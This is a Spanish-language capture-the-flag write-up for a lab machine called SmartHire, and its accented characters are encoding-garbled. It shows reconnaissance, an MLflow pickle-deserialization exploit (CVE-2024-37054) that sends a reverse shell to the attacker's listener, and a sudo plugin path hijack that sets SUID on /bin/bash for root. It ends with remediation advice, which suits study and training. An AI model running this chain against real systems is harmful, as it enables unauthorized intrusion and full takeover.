---
layout: single
classes: wide
title: "SmartHire - Writeup"
date: 2026-05-22
difficulty: Medio
operating_system: Linux
tags:
  - HTB
  - Linux
  - Medio
  - CVE-2024-37054
  - MLflow
  - RCE
  - Pickle
  - Path Hijack
  - SUID
summary: "ExplotaciÃ³n de CVE-2024-37054 (MLflow pickle deserialization RCE) a travÃ©s de subida de CSV malicioso y escalada por path hijack de plugins Python con sudo."
---

## InformaciÃ³n general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Linux |
| Dificultad | Medio |
| Tags | `CVE-2024-37054`, `MLflow`, `RCE`, `Pickle Deserialization`, `Path Hijack`, `SUID` |
{: .info-table}

## Reconocimiento

Empezamos con un escaneo completo de puertos para identificar toda la superficie expuesta del objetivo. QuerÃ­amos descubrir cuÃ¡ntos servicios estaban abiertos y cuÃ¡les podrÃ­an ser vectores de ataque.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.129.41.60 -oG allPorts
```

El escaneo revelÃ³ solo dos puertos abiertos: `22/tcp` (SSH) y `80/tcp` (HTTP). Con estos identificados, lanzamos un escaneo mÃ¡s detallado con scripts de enumeraciÃ³n para obtener versiones y banners de cada servicio.

```bash
nmap -p22,80 -sCV 10.129.41.60 -oN targeted
```

Los resultados confirmaron:

- `22/tcp` â€” OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
- `80/tcp` â€” nginx 1.18.0 con redirecciÃ³n a `http://smarthire.htb/`

Los indicadores mÃ¡s Ãºtiles de esta fase fueron:

- **22/tcp** â€” SSH OpenSSH 8.9p1, acceso remoto si conseguimos credenciales.
- **80/tcp** â€” HTTP nginx 1.18.0 con redirecciÃ³n a `smarthire.htb`, obliga a trabajar con virtual host.

El virtual host `smarthire.htb` nos indicaba que debÃ­amos trabajar con nombres de dominio, asÃ­ que lo agregamos a `/etc/hosts`.

## EnumeraciÃ³n

Analizamos el sitio web con whatweb para identificar tecnologÃ­as y posibles puntos de entrada.

```bash
whatweb http://smarthire.htb
```

La web corre sobre nginx 1.18.0 en Ubuntu, con tÃ­tulo "Overview | SmartHIRE". Es una aplicaciÃ³n de reclutamiento que permite registro de usuarios.

Creamos un usuario nuevo en la plataforma para explorar la funcionalidad interna.

![Registro de usuario](/images/writeups/smarthire/Pasted image 20260518101949.png)

Accedimos con el usuario que acabÃ¡bamos de crear.

![Login exitoso](/images/writeups/smarthire/Pasted image 20260518102020.png)

Una vez dentro, descubrimos que la aplicaciÃ³n permite subir archivos `.csv` con una estructura especÃ­fica para entrenar modelos de ML.

![Subida de CSV](/images/writeups/smarthire/Pasted image 20260518102035.png)

Investigando el comportamiento de la aplicaciÃ³n, vimos que `/upload_hiring_data` entrena un modelo y registra una versiÃ³n, mientras que `/predict` carga el modelo para hacer predicciones. Esto nos hizo sospechar que detrÃ¡s habÃ­a MLflow.

Probamos subir un CSV normal para ver cÃ³mo procesaba los datos la aplicaciÃ³n. El sistema lo aceptÃ³ y entrenÃ³ el modelo sin errores, pero no pudimos extraer informaciÃ³n sensible de la respuesta. NecesitÃ¡bamos un enfoque mÃ¡s agresivo.

Fuzzeamos subdominios con wfuzz para encontrar servicios ocultos detrÃ¡s de virtual hosts alternativos.

```bash
wfuzz -H "Host: FUZZ.smarthire.htb" --hc 404,403 -c --hh 178 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt http://smarthire.htb
```

Encontramos el subdominio `models.smarthire.htb` que devolvÃ­a un `401 Unauthorized`. Lo analizamos con whatweb.

```bash
whatweb http://models.smarthire.htb
```

El encabezado `WWW-Authenticate[mlflow][Basic]` confirmÃ³ que se trataba de un servidor MLflow Tracking con autenticaciÃ³n Basic.

Intentamos acceder a `models.smarthire.htb` con credenciales por defecto como admin:admin, pero el panel rechazÃ³ la autenticaciÃ³n. Seguimos explorando la aplicaciÃ³n principal.

## MetodologÃ­a de anÃ¡lisis del vector inicial

El vector de entrada se priorizÃ³ en la funcionalidad de subida de archivos CSV de la aplicaciÃ³n SmartHIRE, porque la presencia de un servidor MLflow Tracking en `models.smarthire.htb` sugerÃ­a que los CSV subidos se usaban para entrenar modelos de ML. En estos escenarios, la deserializaciÃ³n de modelos pickle es un vector de RCE conocido.

El flujo de ataque consistÃ­a en: crear un usuario, subir un CSV malicioso que incluyera un pickle contaminado durante el entrenamiento, y disparar la deserializaciÃ³n al hacer una predicciÃ³n. El exploit de CVE-2024-37054 automatiza exactamente este proceso.

## InvestigaciÃ³n de vulnerabilidades

La vulnerabilidad principal que guiÃ³ la fase de investigaciÃ³n fue:

- **CVE-2024-37054**: Vulnerabilidad de deserializaciÃ³n insegura de pickle en MLflow que permite ejecuciÃ³n remota de cÃ³digo. Al subir un CSV malicioso, el modelo entrenado incluye un pickle contaminado; cuando el servidor lo carga para hacer predicciones, ejecuta el payload del atacante. Esta vulnerabilidad afecta a MLflow cuando permite registro y carga de modelos sin validaciÃ³n del formato de serializaciÃ³n.

Adicionalmente, la escalada se basÃ³ en una mala prÃ¡ctica de diseÃ±o: un script interno (`mlflowctl.py`) cargaba plugins dinÃ¡micamente mediante `site.addsitedir()` desde un directorio donde el usuario `svcweb` tenÃ­a permisos de escritura, permitiendo path hijack para ejecuciÃ³n de cÃ³digo como root vÃ­a sudo.

## ExplotaciÃ³n

La combinaciÃ³n de subida de archivos CSV y MLflow nos llevÃ³ directamente a `CVE-2024-37054`, una vulnerabilidad de deserializaciÃ³n de pickle en MLflow que permite ejecuciÃ³n remota de cÃ³digo. Al subir un CSV malicioso, el modelo se entrena incluyendo un pickle contaminado; cuando el servidor lo carga para hacer predicciones, ejecuta nuestro payload.

Clonamos el exploit pÃºblico.

```bash
git clone https://github.com/ben-slates/CVE-2024-37054.git
```

Ejecutamos el exploit con nuestras credenciales de la aplicaciÃ³n, apuntando al listener en nuestra mÃ¡quina atacante.

```bash
python3 exploit.py http://smarthire.htb http://models.smarthire.htb 10.10.14.150 4444 --app-username hacker --app-password [REDACTED] --app-login-url http://smarthire.htb/login --upload-url http://smarthire.htb/upload_hiring_data --predict-url http://smarthire.htb/predict
```

El exploit realizÃ³ seis pasos: autenticaciÃ³n en la app, generaciÃ³n del payload pickle malicioso, registro del modelo en MLflow, obtenciÃ³n del run ID, subida del pickle contaminado y disparo de la deserializaciÃ³n vÃ­a `/predict`. Al finalizar nos indicÃ³ que la shell deberÃ­a haberse conectado.

Abrimos el listener y recibimos la conexiÃ³n reversa.

```bash
nc -nlvp 4444
```

```bash
svcweb@smarthire:/var/www/smarthire.htb$ whoami
svcweb
```

### User Flag

```bash
svcweb@smarthire:/home$ cat svcweb/user.txt
[REDACTED]
```

## Escalada de privilegios

Con acceso como `svcweb`, listamos los privilegios sudo.

```bash
svcweb@smarthire:/home$ sudo -l
```

`svcweb` podÃ­a ejecutar `/usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *` como root sin contraseÃ±a.

Examinamos el script y su estructura de plugins.

```bash
svcweb@smarthire:/home$ ls -la /opt/tools/mlflow_ctl/
```

```bash
svcweb@smarthire:/home$ cat /opt/tools/mlflow_ctl/mlflowctl.py
```

```bash
svcweb@smarthire:/home$ ls -la /opt/tools/mlflow_ctl/plugins/
```

El script importa mÃ³dulos desde `plugins/` usando `site.addsitedir()`, que procesa archivos `.pth`. Encontramos el directorio `plugins/dev/` con permisos de escritura para el grupo `devs` (del cual `svcweb` forma parte). Esto nos permitiÃ³ hacer path hijack: colocamos un archivo `.pth` malicioso y un `mlflow_actions.py` que ejecutara cÃ³digo arbitrario.

Creamos el archivo `.pth` para que Python agregue nuestro directorio al path.

```bash
svcweb@smarthire:/tmp$ cat > /opt/tools/mlflow_ctl/plugins/dev/evil.pth << 'EOF'
import sys; sys.path.insert(0, '/opt/tools/mlflow_ctl/plugins/dev')
EOF
```

Luego escribimos un `mlflow_actions.py` malicioso que, al ejecutarse, marcara `/bin/bash` con SUID.

```bash
svcweb@smarthire:/tmp$ cat > /opt/tools/mlflow_ctl/plugins/dev/mlflow_actions.py << 'EOF'
import os

def check_status():
    os.system("chmod +s /bin/bash")

def restart():
    os.system("chmod +s /bin/bash")
EOF
```

Ejecutamos el script con sudo para activar el path hijack.

```bash
svcweb@smarthire:/tmp$ sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
```

Verificamos que el SUID se hubiera aplicado correctamente.

```bash
svcweb@smarthire:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Mar 14  2024 /bin/bash
```

Ejecutamos bash con `-p` para preservar los privilegios y obtener una shell como root.

```bash
svcweb@smarthire:/tmp$ /bin/bash -p
bash-5.1# whoami
root
```

### Root Flag

```bash
bash-5.1# cat /root/root.txt
[REDACTED]
```

## Cadena de explotaciÃ³n

```text
SmartHIRE web app
-> registro de usuario
-> subida de CSV malicioso
-> CVE-2024-37054 (MLflow pickle deserialization)
-> RCE como svcweb
-> sudo en mlflowctl.py
-> path hijack vÃ­a .pth malicioso en plugins/dev/
-> mlflow_actions.py con chmod +s /bin/bash
-> /bin/bash -p
-> shell como root
```

## Flags

| Flag | Valor |
|------|-------|
| `user.txt` | `[REDACTED]` |
| `root.txt` | `[REDACTED]` |

## Lecciones tÃ©cnicas

1. La integraciÃ³n de MLflow sin restricciones de serializaciÃ³n permite deserializaciÃ³n insegura de pickle, lo que equivale a RCE sin autenticaciÃ³n si el endpoint de predicciÃ³n es pÃºblico.
2. Los scripts que cargan plugins dinÃ¡micamente mediante `site.addsitedir()` desde directorios escribibles por el usuario son vectores de path hijack.
3. El uso de sudo sin contraseÃ±a en scripts que importan mÃ³dulos dinÃ¡micamente permite escalada a root si el usuario puede controlar el path de Python.
4. La separaciÃ³n de entornos entre la aplicaciÃ³n web y el panel MLflow debe incluir autenticaciÃ³n fuerte y segmentaciÃ³n de red.

## ConclusiÃ³n

SmartHire demostrÃ³ cÃ³mo una aplicaciÃ³n web que integra MLflow sin restricciones de serializaciÃ³n puede ser comprometida mediante `CVE-2024-37054` (deserializaciÃ³n de pickle). La escalada a root aprovechÃ³ un script interno con plugins cargados dinÃ¡micamente vÃ­a `site.addsitedir()` y permisos de escritura en el directorio de desarrollo, permitiendo un path hijack que ejecutÃ³ cÃ³digo como root a travÃ©s de sudo.

## RemediaciÃ³n

1. Actualizar MLflow a una versiÃ³n que parchee CVE-2024-37054 y validar el formato de serializaciÃ³n de modelos antes de cargarlos.
2. No utilizar `site.addsitedir()` con directorios escribibles por usuarios no privilegiados; usar rutas absolutas y validaciÃ³n de integridad de plugins.
3. Restringir el uso de sudo a scripts que no realicen importaciones dinÃ¡micas o que verifiquen la integridad de los mÃ³dulos cargados.
4. Segregar el servidor MLflow Tracking de la aplicaciÃ³n web principal con autenticaciÃ³n fuerte y segmentaciÃ³n de red.
